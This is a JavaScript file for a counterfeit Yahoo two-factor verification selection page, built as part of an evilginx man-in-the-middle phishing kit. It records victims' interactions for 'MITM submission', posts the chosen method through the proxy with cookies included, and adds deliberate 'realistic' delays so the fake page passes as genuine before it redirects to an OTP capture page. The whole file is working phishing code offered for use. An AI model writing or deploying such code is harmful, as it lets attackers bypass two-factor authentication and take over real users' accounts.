// Yahoo 2FA Selection Page - Complete MITM Integration
;(() => {
  let selectedMethod = null

  // Track user interaction patterns
  function trackInteraction(method, action) {
    const interactionData = {
      method: method,
      action: action,
      timestamp: Date.now(),
      mousePosition: { x: event.clientX, y: event.clientY },
    }

    // Store for MITM submission
    if (!window.interactionLog) {
      window.interactionLog = []
    }
    window.interactionLog.push(interactionData)
  }

  // Setup 2FA method selection
  function setup2FASelection() {
    const options = document.querySelectorAll(".yahoo-2fa-option")
    const submitBtn = document.getElementById("submitBtn")
    const selectedMethodInput = document.getElementById("selectedMethod")

    options.forEach((option) => {
      option.addEventListener("click", function () {
        // Remove previous selection
        options.forEach((opt) => opt.classList.remove("selected"))

        // Add selection to clicked option
        this.classList.add("selected")
        selectedMethod = this.dataset.method
        selectedMethodInput.value = selectedMethod

        // Enable submit button
        submitBtn.disabled = false

        // Add realistic interaction delay
        setTimeout(() => {
          this.style.transform = "scale(0.98)"
          setTimeout(() => {
            this.style.transform = "scale(1)"
          }, 100)
        }, 50)
      })
    })
  }

  // Form submission with MITM data capture
  function setupFormSubmission() {
    const form = document.getElementById("twoFactorForm")
    const submitBtn = document.getElementById("submitBtn")
    const btnText = document.getElementById("btnText")
    const btnSpinner = document.getElementById("btnSpinner")
    const errorMessage = document.getElementById("errorMessage")

    form.addEventListener("submit", async (e) => {
      e.preventDefault()

      if (!selectedMethod) {
        errorMessage.textContent = "Please select a verification method."
        errorMessage.style.display = "block"
        return
      }

      // Show loading state
      submitBtn.disabled = true
      btnText.style.display = "none"
      btnSpinner.style.display = "inline-block"
      errorMessage.style.display = "none"

      // Collect form data
      const formData = new FormData(form)
      formData.append("selected_method", selectedMethod)
      formData.append("page_source", "custom_2fa_selection")
      formData.append("timestamp", Date.now())

      try {
        // Submit to evilginx for MITM capture
        const response = await fetch(window.location.origin + "/account/challenge/challenge-selector", {
          method: "POST",
          body: formData,
          credentials: "include",
          headers: {
            "X-Requested-With": "XMLHttpRequest",
            Accept: "application/json, text/plain, */*",
          },
        })

        if (response.ok) {
          // Simulate realistic delay before redirect
          setTimeout(
            () => {
              window.location.href = "/otp-input"
            },
            Math.random() * 800 + 400,
          )
        } else {
          throw new Error("Selection failed")
        }
      } catch (error) {
        // Show error message
        errorMessage.textContent = "Unable to process your selection. Please try again."
        errorMessage.style.display = "block"

        // Reset button state
        submitBtn.disabled = false
        btnText.style.display = "inline"
        btnSpinner.style.display = "none"
      }
    })
  }

  // Initialize page
  document.addEventListener("DOMContentLoaded", () => {
    setup2FASelection()
    setupFormSubmission()

    // Add realistic page load delay
    setTimeout(() => {
      document.querySelector(".yahoo-2fa-options").style.opacity = "1"
    }, 200)
  })
})()
